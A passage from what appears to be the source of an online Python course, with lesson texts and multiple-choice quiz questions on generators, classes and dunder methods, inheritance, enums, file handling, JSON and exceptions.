Because each stage pulls one item at a time, generators compose into a pipeline that never materialises an intermediate list:

\`\`\`python
def only_errors(records):
    for r in records:
        if r["status"] >= 500:
            yield r

def paths(records):
    for r in records:
        yield r["path"].strip("/")

for path in paths(only_errors(parsed_lines("access.log"))):
    print(path)
\`\`\`

Three transformations over a 4 GB file with one record resident at a time.

### yield from delegates

\`\`\`python
def all_rows(paths):
    for p in paths:
        yield from parsed_lines(p)
\`\`\`

\`yield from\` replaces the obvious inner loop, and it also forwards \`close()\` and \`throw()\` to the sub-generator, which the hand-written loop quietly does not.

### Errors arrive late

This is the surprise that costs people an afternoon:

\`\`\`python
def load(path):
    if not Path(path).exists():
        raise FileNotFoundError(path)
    with open(path, encoding="utf-8") as f:
        for line in f:
            yield line

try:
    rows = load("missing.csv")    # nothing raises here
except FileNotFoundError:
    rows = []                     # this branch never runs
\`\`\`

The check lives in a body that has not started. Validate eagerly in a plain function that returns the generator:

\`\`\`python
def load(path):
    if not Path(path).exists():
        raise FileNotFoundError(path)
    return _rows(path)            # _rows holds the yield
\`\`\`

### Cleanup happens later than you think

\`\`\`python
for row in parsed_lines("access.log"):
    if row["status"] == 500:
        break        # the generator is left suspended at its yield
\`\`\`

The \`with\` inside the generator has not exited yet. The file stays open until the generator is closed or collected. CPython usually collects it right away, so this hides perfectly on your laptop and then surfaces as \`OSError: too many open files\` on a long-running server. Consume the generator fully, close it explicitly with \`contextlib.closing\`, or keep it local so it goes out of scope at once.

| Want | Use |
|---|---|
| One pass over something huge | a generator function |
| Indexing, length, or a second pass | build a \`list\` |
| One expression rather than a function | a generator expression |

A generator is not a container. \`len(rows)\` raises \`TypeError\`, \`rows[0]\` raises \`TypeError\`, and a second loop yields nothing at all. When you need any of those, spend the memory deliberately with \`list(rows)\` rather than discovering the limitation three functions away.

One more detail worth carrying: \`return value\` inside a generator does not produce that value to the caller. It stops iteration, and the value is attached to the \`StopIteration\` it raises, which only \`yield from\` reads. Inside a generator, \`return\` means stop.
      `,
        [
          q('rows = parsed_lines("missing.log") does not raise, even though the generator function opens that file. Why not?', [
            'The exception was absorbed by the with statement inside it',
            'open always defers its errors until the first read call',
            'Calling a generator function only builds the generator object',
            'Generators convert every exception into StopIteration',
          ], 2, 'The body does not start executing until the first next() or for loop, so anything that would raise inside it stays silent until iteration actually begins.'),
          q('Inside all_rows you write for r in parsed_lines(p): yield r. What does yield from parsed_lines(p) change?', [
            'It buffers the inner generator into a list before yielding',
            'It says the same thing in one line and forwards close and throw',
            'It runs the inner generator eagerly at the moment of the call',
            'It closes the inner generator after its very first item',
          ], 1, 'yield from delegates iteration to the sub-generator, producing identical values with less code while also passing close() and throw() through correctly.'),
          q('You break out of a loop over a generator that opened a file in a with block. What is true of that file?', [
            'It closes only when the generator is closed or collected',
            'It was closed the instant the break statement executed',
            'It never closes, because with is ignored inside generators',
            'It closes as soon as the generator raises StopIteration',
          ], 0, 'The generator is left suspended at its yield, so the with block\'s exit code runs only once the generator is explicitly closed or garbage collected.'),
        ]
      ),
      ],
      [
        q('def add_item(item, basket=[]) — why does the second call return two items?', [
          'Lists are global by default in Python',
          'The default list is created once when def runs and is shared by every call',
          'append mutates the parameter name rather than the object',
          'Python caches the return value of functions',
        ], 1, 'Default arguments are evaluated once at definition time, so one list object persists across every call that omits it.'),
        q('total = 0 at module level; inside a function, total = total + n raises UnboundLocalError. Why?', [
          'Module-level names are read-only',
          'Assigning to a name anywhere in a function makes it local for the whole function',
          '+ is undefined between a global and a parameter',
          'The function is missing a return statement',
        ], 1, 'The assignment marks total as local, so the read on the right-hand side happens before it has any value.'),
        q('What does the if __name__ == "__main__": guard prevent?', [
          'Circular imports between modules',
          'Script-level code running when the module is imported by something else',
          'Syntax errors inside packages',
          'Two modules sharing a name',
        ], 1, 'On import __name__ is the module name, so the guarded block only runs when the file is executed directly.'),
        q('Why give each project its own virtual environment?', [
          'It makes imports measurably faster',
          'Different projects can need conflicting versions of the same package',
          'pip refuses to run outside one',
          'It compiles the project to bytecode ahead of time',
        ], 1, 'An isolated site-packages per project means upgrading a dependency for one project cannot break another.'),
      ]
    ),
    chapter(
      'Objects, Classes, and Dunder Methods',
      'Bundling state with behaviour, hooking into Python syntax, and knowing when not to write a class at all.',
      [
        lesson('Classes, Instances, and Attributes', 12, `
A class bundles data with the functions that operate on it. Reach for one when you have state *and* behaviour that belong together — not merely because you have data.

\`\`\`python
class Course:
    def __init__(self, slug: str, title: str, hours: int):
        self.slug = slug          # instance attributes
        self.title = title
        self.hours = hours

    def is_short(self) -> bool:
        return self.hours < 10

c = Course("python-development", "Python Development", 24)
c.is_short()      # False
\`\`\`

\`__init__\` is not a constructor — the object already exists by the time it runs. It is the *initialiser*, and its only job is to set attributes.

\`self\` is the instance, passed automatically. \`c.is_short()\` is literally \`Course.is_short(c)\`; there is no magic, only a convention that the first parameter is named \`self\`.

### Class attributes are shared — the classic bug

\`\`\`python
class Course:
    tags = []                      # WRONG: one list for the entire class

    def add_tag(self, tag):
        self.tags.append(tag)

a, b = Course(), Course()
a.add_tag("python")
b.tags                             # ['python'] — b never added anything
\`\`\`

That list was created once, when the class body executed, and every instance mutates the same object. It is the mutable-default bug from Chapter 2 wearing a different hat, and it is just as common. Mutable state belongs in \`__init__\`:

\`\`\`python
class Course:
    def __init__(self):
        self.tags = []             # a fresh list per instance
\`\`\`

Class attributes are for genuine shared constants: \`MAX_HOURS = 40\`.

### Static and class methods

\`\`\`python
class Course:
    @classmethod
    def from_row(cls, row):            # alternate constructor
        return cls(row["slug"], row["title"], int(row["hours"]))

    @staticmethod
    def slugify(title):                # needs neither instance nor class
        return "-".join(title.lower().split())
\`\`\`

\`@classmethod\` receives the class itself, which is exactly why it is the right tool for alternate constructors: a subclass calling \`from_row\` gets a subclass instance without overriding anything.

### Properties: computed and validated attributes

\`\`\`python
class Course:
    def __init__(self, hours):
        self.hours = hours             # goes through the setter below

    @property
    def hours(self):
        return self._hours

    @hours.setter
    def hours(self, value):
        if value <= 0:
            raise ValueError("hours must be positive")
        self._hours = value

    @property
    def weeks(self):                   # read-only, computed on access
        return round(self._hours / 6)
\`\`\`

Callers still write \`c.hours = 20\` and read \`c.weeks\` — no getter/setter noise anywhere. This is precisely why Python code does not start out with \`get_hours()\`/\`set_hours()\` "in case validation is needed later": you can add a property afterwards without changing a single call site.

### Privacy is a convention

A single leading underscore (\`_hours\`) means "internal, do not touch". Nothing enforces it. A double underscore (\`__hours\`) triggers name mangling to \`_Course__hours\`, which exists to avoid accidental collisions in subclasses — not to provide security. There is no \`private\` in Python, and code that pretends otherwise is fighting the language.

### When not to write a class

A class with one method and no state is a function with extra ceremony. A class that only holds data is a \`dataclass\` or a \`dict\`. Write a class when instances have identity and their behaviour depends on their own state — otherwise a module of plain functions is easier to read, easier to import, and easier to test.
        `,
        [
          q('Why is @classmethod the right tool for an alternate constructor such as Course.from_row?', [
            'It receives the class, so a subclass call returns a subclass instance',
            'It runs before __init__ and can reject bad input first',
            'It is the only kind of method allowed to return an object',
            'It binds to the instance, so self is already available',
          ], 0, 'The cls parameter is whatever class the call was made on, so from_row builds the correct type without a subclass having to override it.'),
          q('A class exposes c.hours as a plain attribute and now needs validation on assignment. What does Python allow?', [
            'Rename the attribute and update every call site in the codebase',
            'Add a property with a setter, leaving c.hours = 20 working unchanged',
            'Move the check into __init__, since attributes cannot be guarded',
            'Replace the attribute with get_hours() and set_hours() methods',
          ], 1, 'A property intercepts ordinary attribute access, so validation can be added later without touching a single caller, which is why Python code does not start with getters.'),
          q('What does writing self.__hours instead of self._hours actually do?', [
            'Makes the attribute read-only from outside the class body',
            'Hides the attribute from dir() and from the debugger',
            'Renames it to _Course__hours, avoiding subclass collisions',
            'Raises AttributeError if anything outside the class reads it',
          ], 2, 'A double underscore triggers name mangling, which exists to stop subclasses clashing accidentally and provides no privacy or protection of any kind.'),
        ]
      ),
        lesson('Dunder Methods and Dataclasses', 13, `
Dunder ("double underscore") methods are how your objects hook into Python's syntax. \`len(x)\` calls \`x.__len__()\`, \`a + b\` calls \`a.__add__(b)\`, \`with x:\` calls \`x.__enter__()\`. Implement the right ones and your class behaves like a built-in.

### \`__repr__\` first, always

\`\`\`python
class Course:
    def __init__(self, slug, hours):
        self.slug, self.hours = slug, hours

    def __repr__(self):
        return f"Course(slug={self.slug!r}, hours={self.hours})"
\`\`\`

Without it, a list of courses prints as \`[<__main__.Course object at 0x10a3f21d0>, ...]\`, and every debugging session and every failed assertion starts with a guess. \`__repr__\` is for developers and should ideally look like the code that would recreate the object; \`__str__\` is for end users and falls back to \`__repr__\` when you have not defined it. So write \`__repr__\`, and add \`__str__\` only when the user-facing text genuinely differs. The \`!r\` in the f-string applies \`repr()\` to the field, which is what puts the quotes around a string.

### \`__eq__\` and \`__hash__\` travel together

\`\`\`python
class Course:
    def __eq__(self, other):
        if not isinstance(other, Course):
            return NotImplemented
        return self.slug == other.slug

    def __hash__(self):
        return hash(self.slug)
\`\`\`

By default, equality is identity: two \`Course\` objects holding identical data are not equal. Defining \`__eq__\` fixes that — but **Python then sets \`__hash__\` to \`None\`**, and your objects can no longer go into a set or be used as dict keys. The error, \`TypeError: unhashable type: 'Course'\`, arrives far from the class you edited, which is what makes it the classic surprise. If the fields you compare are effectively immutable, define \`__hash__\` from the same fields. If they are not, leaving the type unhashable is the honest answer: a key whose hash changes after insertion is a lost entry.

Returning \`NotImplemented\` (not \`False\`) for an unknown type lets Python try the reflected comparison before giving up.

### Length, truth, containment, iteration

\`\`\`python
class Playlist:
    def __init__(self, items):  self.items = list(items)
    def __len__(self):          return len(self.items)
    def __getitem__(self, i):   return self.items[i]
    def __contains__(self, x):  return x in self.items
    def __iter__(self):         return iter(self.items)
\`\`\`

That class now supports \`len(p)\`, \`p[0]\`, \`p[1:3]\`, \`for x in p\`, and \`x in p\`. Note that \`__bool__\` falls back to \`__len__\`, so an empty playlist is already falsy and \`if playlist:\` does the right thing with no extra code.

For sorting, \`__lt__\` is the minimum \`sorted()\` requires; \`functools.total_ordering\` derives the rest from \`__eq__\` and \`__lt__\`.

### Context managers

\`\`\`python
import time

class Timer:
    def __enter__(self):
        self.start = time.perf_counter()
        return self

    def __exit__(self, exc_type, exc, tb):
        self.elapsed = time.perf_counter() - self.start
        return False            # False: do not swallow exceptions

with Timer() as t:
    load_courses()
print(t.elapsed)
\`\`\`

\`__exit__\` runs even when the block raises — that guarantee is the entire point, and it is why \`with open(...)\` is the only correct way to open a file (Chapter 4). Returning \`True\` from \`__exit__\` **suppresses** the exception, which is almost always a mistake.

### Dataclasses write the boring ones for you

\`\`\`python
from dataclasses import dataclass, field

@dataclass(frozen=True, slots=True)
class Course:
    slug: str
    title: str
    hours: int = 0
    tags: list[str] = field(default_factory=list)     # never tags: list = []
\`\`\`

You get \`__init__\`, \`__repr__\`, and \`__eq__\` for free; \`frozen=True\` blocks attribute assignment after construction and generates a \`__hash__\`; \`slots=True\` cuts memory and blocks typos that would otherwise create a new attribute. A generated hash is only *usable* if every compared field is itself hashable — the \`tags\` list above still makes \`hash(course)\` raise \`TypeError: unhashable type: 'list'\`, so a frozen dataclass you intend to put in a set wants \`tags: tuple[str, ...] = ()\` instead. Note \`default_factory\`: the mutable default trap applies to dataclass fields too, and here Python is kind enough to raise a \`ValueError\` at class creation rather than let you ship it.
        `,
        [
          q('Your context manager\'s __exit__ ends with return True. What changes for the code using it?', [
            'Cleanup now runs twice whenever the block raises',
            'The with statement returns the manager rather than None',
            '__enter__ is skipped the next time the manager is used',
            'Exceptions raised inside the block are swallowed and never seen',
          ], 3, 'A truthy return from __exit__ tells Python the exception has been handled, so genuine failures vanish and the block appears to have succeeded.'),
          q('A @dataclass(frozen=True) has a tags: list[str] field, and hash(course) raises TypeError. Why?', [
            'frozen only blocks assignment, it never generates a __hash__',
            'Dataclasses cannot generate a working __hash__ under any flags',
            'The generated hash hashes every field, and a list is unhashable',
            'Type hints are not enforced, so tags is not really a list here',
          ], 2, 'The generated __hash__ hashes the tuple of compared fields, so one unhashable field poisons the whole object; a tuple field fixes it.'),
          q('You define __str__ on a class but not __repr__. How does a list of those objects print?', [
            'Using the __str__ text you wrote, for each element',
            'As the default <Course object at 0x...> for each element',
            'As an empty list, because printing a container needs __repr__',
            'It raises a TypeError complaining that __repr__ is missing',
          ], 1, 'Containers display each element using repr, and repr falls back to the default object form when only __str__ has been defined.'),
        ]
      ),
        lesson('Inheritance, Composition, and Duck Typing', 13, `
Inheritance says "this **is a** that". It is the narrowest of the reuse tools and by far the most overused.

\`\`\`python
class Content:
    def __init__(self, title, minutes):
        self.title, self.minutes = title, minutes

    def summary(self):
        return f"{self.title} ({self.minutes} min)"

class Lesson(Content):
    def __init__(self, title, minutes, video_url):
        super().__init__(title, minutes)        # run the parent initialiser
        self.video_url = video_url

    def summary(self):
        return super().summary() + " · video"
\`\`\`

\`super().__init__(...)\` is not optional politeness. Skip it and the parent's attributes are never set, so \`self.title\` raises \`AttributeError\` from inside a method you did not write and did not change — one of the more disorienting errors a beginner meets.

### The Liskov test

A subclass must be usable anywhere the parent is, without the caller knowing. The moment a subclass *narrows* behaviour — raising where the parent succeeds, ignoring an argument the parent honours — every function that accepts the parent is conditionally broken.

\`\`\`python
class CappedList(list):
    def append(self, item):
        if len(self) >= 10:
            raise ValueError("full")
        super().append(item)

c = CappedList(range(20))     # no error — __init__ never calls append
c.extend([1, 2, 3])           # no error — extend does not call append either
\`\`\`

Subclassing a built-in to enforce a rule almost never works, because the built-in's other methods are implemented in C and bypass your override entirely. This is the standard example of inheriting for *code reuse* rather than for *is-a*, and the fix is composition: hold a list, expose only the operations you intend to support.

### Prefer composition

\`\`\`python
class Enrolment:
    def __init__(self, notifier):          # inject the collaborator
        self.notifier = notifier

    def enrol(self, student, course):
        record = save(student, course)
        self.notifier.send(student, f"Enrolled in {course}")
        return record
\`\`\`

\`Enrolment\` does not care whether \`notifier\` sends email, sends SMS, or is a test double that records calls. Swapping it needs no subclass and no change to \`Enrolment\`. That one constructor argument is also exactly what lets you test this class in Chapter 5 without touching the network.

### Duck typing and Protocols

Python does not require a shared base class. If an object has the method, it works:

\`\`\`python
from typing import Protocol

class Notifier(Protocol):
    def send(self, to: str, message: str) -> None: ...
\`\`\`

A \`Protocol\` is a **structural** type: any class with a matching \`send\` satisfies it, with no inheritance and no import in the implementing class. Type checkers verify it; the runtime does not care. It is how you document a collaborator's interface without forcing everyone into your hierarchy.

### isinstance, and where it belongs

\`\`\`python
if isinstance(value, (int, float)):     # fine at a boundary, validating input
\`\`\`

Deep inside your own code, a chain of \`isinstance\` checks dispatching to different behaviour is usually a method that wants to live on the objects themselves.

### The MRO, briefly

Multiple inheritance resolves names through the **method resolution order**:

\`\`\`python
class A: ...
class B(A): ...
class C(A): ...
class D(B, C): ...

D.__mro__      # D, B, C, A, object
\`\`\`

\`super()\` follows that order — it does not simply mean "the parent". Mixins depend on this. Diamond hierarchies are also where it becomes a debugging problem, which is one more reason to keep hierarchies one or two levels deep and reach for composition instead.
        `,
        [
          q('Lesson.__init__ sets self.video_url but never calls super().__init__. What is the symptom?', [
            'Lesson objects cannot be created at all',
            'The parent __init__ silently runs twice instead',
            'video_url is quietly set to None on every instance',
            'AttributeError on self.title from an inherited method',
          ], 3, 'The parent initialiser never ran, so its attributes were never created and the failure surfaces inside inherited code the subclass author never wrote.'),
          q('How does a class satisfy a typing.Protocol such as Notifier?', [
            'By inheriting from Notifier explicitly in its definition',
            'By calling Notifier.register(cls) somewhere at import time',
            'By having methods whose names and signatures match',
            'By passing an isinstance(obj, Notifier) check at runtime',
          ], 2, 'A Protocol is a structural type, so a matching set of methods is enough and the implementing class needs no inheritance and no import.'),
          q('Enrolment takes a notifier as a constructor argument rather than creating one. Which benefit follows directly?', [
            'A test can pass a recording double, so no email is ever sent',
            'The notifier is created lazily, on its first actual use',
            'Enrolment inherits any method added to the notifier later',
            'The notifier can be swapped out without writing a setter',
          ], 0, 'Injecting the collaborator lets a test substitute a fake that records calls, which is what keeps a unit test off the network entirely.'),
        ]
      ),
            lesson('Enums for Fixed Sets of Values', 12, `
A refund job compared \`order.status == "cancelled"\` while the code that wrote the record stored \`"canceled"\`. One letter. No error, no warning, and no refunds for eleven days. Strings make terrible constants precisely because every typo is still a perfectly valid string.

### Members are objects, not strings

\`\`\`python
from enum import Enum

class Status(Enum):
    DRAFT = "draft"
    PUBLISHED = "published"
    ARCHIVED = "archived"

Status.DRAFT           # <Status.DRAFT: 'draft'>
Status.DRAFT.name      # 'DRAFT'
Status.DRAFT.value     # 'draft'
Status.DRFAT           # AttributeError, immediately, at the typo
\`\`\`

That last line is the entire argument. A misspelled attribute fails on the spot; a misspelled string comparison just returns \`False\` and takes the wrong branch.

An \`Enum\` is an ordinary class, and each member is a singleton instance of it, created once when the class body runs. Because exactly one \`Status.PUBLISHED\` object exists in the process, identity comparison is both correct and idiomatic:

\`\`\`python
if status is Status.PUBLISHED:
    publish()
\`\`\`

### Lookups, iteration, uniqueness

\`\`\`python
list(Status)                # members, in definition order
Status("draft")             # by value, for rows coming out of a database
Status["DRAFT"]             # by name, for values coming out of config
Status.DRAFT in Status      # True
\`\`\`

\`Status("cancelled")\` raises \`ValueError: 'cancelled' is not a valid Status\`. That is the loud failure at the boundary the string version never gave you. Two members sharing a value become aliases rather than an error, so add the \`@unique\` decorator above the class when a duplicate would be a bug.

### The gotcha nobody expects

\`\`\`python
Status.DRAFT == "draft"     # False
\`\`\`

A member wraps its value, it is not that value. Code that loads a status out of JSON and compares it against a member silently fails every check. Two ways out:

\`\`\`python
class Status(str, Enum):    # members are genuine strings as well
    DRAFT = "draft"

Status.DRAFT == "draft"     # True
\`\`\`

Python 3.11 ships \`StrEnum\`, which does the same thing under a clearer name. The same wrinkle hits serialisation:

\`\`\`python
import json

json.dumps({"status": Status.DRAFT})         # TypeError: not JSON serializable
json.dumps({"status": Status.DRAFT.value})   # '{"status": "draft"}'
\`\`\`

A \`str\` based enum serialises with no \`.value\` and no custom encoder, which is normally worth the small loss of strictness at the edges of the system.

### Behaviour belongs on the enum

Because it is a class, it takes methods, and the rule that used to live in an \`if\` chain three modules away moves onto the thing it describes:

\`\`\`python
class Status(Enum):
    DRAFT = "draft"
    PUBLISHED = "published"
    ARCHIVED = "archived"

    @property
    def is_visible(self) -> bool:
        return self is Status.PUBLISHED

    def next(self) -> "Status":
        order = list(Status)
        return order[min(order.index(self) + 1, len(order) - 1)]

Status.DRAFT.is_visible     # False
Status.DRAFT.next()         # <Status.PUBLISHED: 'published'>
\`\`\`

| Need | Use |
|---|---|
| A fixed set of named states | \`Enum\` |
| The same, comparable to plain strings | \`StrEnum\`, or \`str, Enum\` |
| Numbers you never persist anywhere | \`auto()\` |
| Combinable flags such as permissions | \`Flag\` |

\`auto()\` assigns 1, 2, 3 in definition order and is fine for values that stay inside one process. The moment a value reaches a database or a JSON file, spell it out. Inserting a member into the middle of an \`auto()\` enum renumbers everything below it, which silently changes the meaning of every row already stored.

Reach for an enum when a field has a small, closed set of legal values and your code branches on them. For an open set, such as country codes pulled from a table, a plain string is still the right answer.
      `,
        [
          q('With a plain Enum, why does Status.DRAFT == "draft" evaluate to False?', [
            'The member is an object whose value is that string, not the string',
            'Enum members compare only by name, and never by value',
            'Enum defines __eq__ so that it rejects all comparisons',
            'The comparison needs Status.DRAFT.name on the left side',
          ], 0, 'A member wraps its value rather than being it, so comparison against the raw string fails unless the enum also subclasses str or uses StrEnum.'),
          q('What does replacing the literal "cancelled" with Status.CANCELLED actually prevent?', [
            'Two workers writing the same status at the same moment',
            'A misspelled name failing loudly rather than comparing False',
            'The status being stored in the database as plain text',
            'Any comparison at all between a status and a string',
          ], 1, 'An unknown attribute on the enum raises AttributeError at once, while a misspelled string literal just compares unequal and quietly takes the wrong branch.'),
          q('json.dumps({"status": Status.DRAFT}) raises TypeError. Which fix is correct?', [
            'Wrap the dictionary in list() before dumping it',
            'Pass sort_keys=True so the encoder walks the members',
            'Rename the member to lowercase so it matches its value',
            'Serialise Status.DRAFT.value, or make the enum subclass str',
          ], 3, 'The JSON encoder handles only built-in types, so you pass the member\'s value or use a str based enum whose members already are strings.'),
        ]
      ),
      ],
      [
        q('A class defines tags = [] in the class body and a method that appends to self.tags. What happens?', [
          'Each instance gets its own empty list',
          'Every instance shares one list, so tags added on one appear on all',
          'Appending raises AttributeError',
          'The list is copied on first write',
        ], 1, 'The list is created once when the class body runs, so all instances mutate that single object; mutable state belongs in __init__.'),
        q('You add __eq__ to a class and now its instances cannot go in a set. Why?', [
          'Sets require __lt__ to be defined',
          'Defining __eq__ sets __hash__ to None unless you also define __hash__',
          'Sets only accept built-in types',
          '__eq__ must return NotImplemented for sets to work',
        ], 1, 'Equality and hashing must agree, so Python removes the inherited identity hash when you redefine equality.'),
        q('Which is the right first dunder method to add to a new class?', [
          '__str__, because users see it',
          '__repr__, because it is what the REPL, containers, and failing tests show',
          '__len__, because it enables truthiness',
          '__init__ alone is sufficient',
        ], 1, '__repr__ is the developer-facing form and __str__ falls back to it, so writing __repr__ improves every debug output at once.'),
        q('Why does subclassing list to enforce a maximum length usually fail?', [
          'list cannot be subclassed',
          'The other list methods bypass your overridden append',
          'Subclasses cannot call super()',
          'Python forbids raising inside a dunder method',
        ], 1, 'extend, __init__, and slice assignment are implemented internally and never route through your override, so the rule leaks.'),
      ]
    ),
    chapter(
      'Files, JSON, and Failing Well',
      'Reading and writing data without losing it, moving it in and out of JSON, and handling errors so they surface instead of hiding.',
      [
        lesson('Files, Paths, and the with Statement', 12, `
### Always use \`with\`

\`\`\`python
with open("courses.csv", encoding="utf-8") as f:
    header = f.readline()
    for line in f:
        process(line.rstrip())
# the file is closed here — normal exit, return, or exception
\`\`\`

\`with\` calls the file object's \`__exit__\` (Chapter 3) on the way out, whatever happens. A bare \`open()\` leaks a handle every time something raises before your \`close()\`, and on Windows a still-open file cannot be deleted or replaced. There is no reason to write \`f.close()\` by hand.

### Modes, and the one that destroys data

| Mode | Meaning |
|---|---|
| \`"r"\` | read (default); error if the file is missing |
| \`"w"\` | write — **truncates the file to zero immediately** |
| \`"a"\` | append to the end |
| \`"x"\` | create; error if it already exists |
| \`"rb"\` / \`"wb"\` | binary — you get \`bytes\`, not \`str\` |

\`open(path, "w")\` empties the file the instant it succeeds, before you have written a single byte. If the program then crashes — or the data you were about to write turns out to be malformed — the old contents are simply gone. When rewriting a file that matters, write a temporary file and rename over the original, because rename is atomic:

\`\`\`python
from pathlib import Path

tmp = Path("courses.json.tmp")
tmp.write_text(payload, encoding="utf-8")
tmp.replace("courses.json")     # atomic: readers never see a half-written file
\`\`\`

### Always pass \`encoding="utf-8"\`

Without it, Python uses the platform default, which is UTF-8 on modern Linux and macOS but has historically been cp1252 on Windows. The same script then reads the same file perfectly on your laptop and throws \`UnicodeDecodeError\` on a colleague's — over one accented character in row 4,000 of a file that worked yesterday. Pass \`encoding\` on every text-mode open, reading and writing alike.

### Read lazily

\`\`\`python
text = f.read()      # the whole file in memory — fine at 4 KB, fatal at 4 GB
for line in f:       # one line at a time, constant memory
\`\`\`

Iterating a file object yields lines lazily. Reach for \`.read()\` only when you already know the file is small.

### pathlib beats string paths

\`\`\`python
from pathlib import Path

base = Path("data")
path = base / "2026" / "courses.json"      # correct separator on every OS
path.parent.mkdir(parents=True, exist_ok=True)
path.write_text(payload, encoding="utf-8")

path.exists(), path.suffix, path.stem, path.name
for p in base.glob("**/*.json"):
    ...
\`\`\`

\`base / "2026"\` is not string concatenation — \`Path\` implements \`__truediv__\` (another dunder from Chapter 3) to join segments. \`exist_ok=True\` is what makes \`mkdir\` idempotent, so re-running your script is not an error, and \`parents=True\` creates the intermediate directories.

Never build paths with \`+\` and a hardcoded \`/\`. Never reach for \`os.path.join\` in new code when \`pathlib\` is available.

### CSV: use the module

\`\`\`python
import csv

with open("courses.csv", newline="", encoding="utf-8") as f:
    for row in csv.DictReader(f):
        print(row["title"], row["hours"])     # every value is a str
\`\`\`

\`line.split(",")\` breaks the first time a field contains a comma inside quotes — which real data always eventually does. \`newline=""\` is required by the \`csv\` module so it can handle line breaks embedded inside quoted fields itself. And remember every value comes back as a string: \`int(row["hours"])\` is your job.
        `,
        [
          q('Why does the csv module ask you to open the file with newline="" rather than leaving it out?', [
            'It makes reading faster by skipping newline translation',
            'So csv itself handles line breaks that sit inside quoted fields',
            'It forces UTF-8 whatever the platform default happens to be',
            'It stops the writer from emitting a header row twice',
          ], 1, 'The module needs the raw line endings so it can decide which newlines are inside a quoted value and which actually end a row.'),
          q('path.parent.mkdir(parents=True, exist_ok=True) runs a second time on the next execution. What happens?', [
            'FileExistsError, because that directory is already there',
            'The directory is recreated and its contents are cleared',
            'Only the deepest directory is checked, so it still raises',
            'Nothing at all, because exist_ok makes the call a no-op',
          ], 3, 'exist_ok=True turns an already existing directory into a silent no-op, which is what makes re-running the script safe.'),
          q('Your reader works on macOS and throws UnicodeDecodeError on a colleague\'s Windows machine. Most likely cause?', [
            'open was called without encoding, so the platform default applied',
            'The file was saved with CRLF line endings',
            'pathlib returns bytes rather than str on Windows',
            'The file is larger than the default read buffer',
          ], 0, 'With no encoding argument Python falls back to the platform default, which has historically been cp1252 on Windows and fails on the first non-ASCII byte.'),
        ]
      ),
        lesson('JSON and Data Interchange', 12, `
JSON is the format your APIs, config files, and structured logs are written in. Python's \`json\` module maps it onto built-in types with no third-party dependency.

### Four functions, two of which everyone confuses

\`\`\`python
import json

json.dumps(obj)        # -> str            ("dump-s" = dump to string)
json.loads(text)       # -> Python object, from a str
json.dump(obj, f)      # write to an open file object
json.load(f)           # read from an open file object
\`\`\`

The \`s\` suffix means "string". \`json.dump(obj)\` with no file raises a confusing \`TypeError\`, and \`json.loads(open(path))\` fails because it wants text, not a handle. Match the pair to what you are holding.

\`\`\`python
with open("courses.json", encoding="utf-8") as f:
    courses = json.load(f)
\`\`\`

### The type mapping

| Python | JSON |
|---|---|
| \`dict\` | object |
| \`list\`, \`tuple\` | array |
| \`str\` | string |
| \`int\`, \`float\` | number |
| \`True\` / \`False\` | \`true\` / \`false\` |
| \`None\` | \`null\` |

Notice what a round trip loses: a \`tuple\` returns as a \`list\`, and **every object key becomes a string**.

\`\`\`python
json.loads(json.dumps({1: "a"}))     # {'1': 'a'} — the int key is now the str '1'
\`\`\`

Code that does \`data[user_id]\` after a round trip with integer ids raises \`KeyError: 7\` on a key that is visibly right there in the printed dict. Keep keys as strings deliberately, or convert them back explicitly on load.

### Writing readable, stable output

\`\`\`python
text = json.dumps(course, indent=2, sort_keys=True, ensure_ascii=False)
\`\`\`

- \`indent=2\` for anything a human or a diff will read; omit it for network payloads, where it is wasted bytes.
- \`sort_keys=True\` makes output deterministic, so a committed config file stops producing spurious diffs.
- \`ensure_ascii=False\` keeps non-English text readable instead of escaping it — pair it with \`encoding="utf-8"\` on the file, per the previous lesson.

### Types JSON does not have

\`datetime\`, \`Decimal\`, \`set\`, and your own classes all raise \`TypeError: Object of type datetime is not JSON serializable\`. Convert at the boundary:

\`\`\`python
from datetime import datetime

def encode(obj):
    if isinstance(obj, datetime):
        return obj.isoformat()
    if isinstance(obj, set):
        return sorted(obj)
    raise TypeError(f"not serializable: {type(obj).__name__}")

json.dumps(record, default=encode)
\`\`\`

ISO 8601 strings such as \`2026-08-19T10:30:00+00:00\` are the right wire format for time: sortable as text, unambiguous about timezone, and readable back with \`datetime.fromisoformat\`.

### Trust nothing you loaded

Valid JSON is not valid *data*. A field can be missing, null, or the wrong type, and the API you rely on will change without telling you:

\`\`\`python
data  = json.loads(text)
title = data.get("title", "Untitled")     # no KeyError
hours = data.get("hours") or 0
tags  = data.get("tags") or []

if not isinstance(data.get("chapters"), list):
    raise ValueError("chapters must be a list")
\`\`\`

\`data["title"]\` on an API response is a crash waiting for the day the provider renames a field. Beyond a couple of fields, validate the whole shape once with a library such as \`pydantic\` and work with a typed object afterwards — then the failure happens at the boundary with a clear message, instead of three functions deeper as an \`AttributeError\` on \`None\`.

### Never \`pickle\` or \`eval\` data you did not write

\`json.loads\` on hostile input is safe; the worst case is a \`JSONDecodeError\`. \`pickle.loads\` and \`eval\` on hostile input **execute arbitrary code**, and there is no flag that makes them safe. Use \`pickle\` only for data your own process wrote to your own disk, never for anything crossing a trust boundary.
        `,
        [
          q('You are holding an open file object f and a dict called data. Which call writes JSON into that file?', [
            'json.dumps(data, f)',
            'json.load(data, f)',
            'json.dump(data, f)',
            'json.loads(f, data)',
          ], 2, 'The s suffix means string, so dumps returns text while dump writes straight into an open file object, and load reads rather than writes.'),
          q('Why is pickle.loads unsafe on a payload that arrived over the network?', [
            'It is slower than json once payloads grow past a megabyte',
            'It cannot represent dictionaries nested more than once',
            'Unpickling can construct objects and execute code from the payload',
            'It silently truncates any string longer than 64 KB',
          ], 2, 'The pickle format can instruct the interpreter to import and call things, so hostile input runs arbitrary code and no option makes it safe.'),
          q('A committed config file shows a large diff every time your script rewrites it, though the data did not change. Which flag helps?', [
            'ensure_ascii=False, so text is written unescaped',
            'sort_keys=True, so the key order is deterministic',
            'separators set tightly, so whitespace cannot vary',
            'indent=None, so the whole file is one long line',
          ], 1, 'Sorting the keys makes the serialised output identical whenever the underlying data is identical, which removes diffs caused purely by ordering.'),
        ]
      ),
        lesson('Errors and Exceptions', 13, `
Python signals failure by raising, not by returning error codes. A call either produced a result or raised — there is no third state you can forget to check, which is why Python code has so few \`if result == -1\` branches.

### try / except / else / finally

\`\`\`python
try:
    data = json.loads(text)              # only the risky line
except json.JSONDecodeError as err:
    logger.warning("bad payload: %s", err)
    return None
else:
    return normalise(data)               # runs only if nothing was raised
finally:
    metrics.increment("parse.attempt")   # runs no matter what
\`\`\`

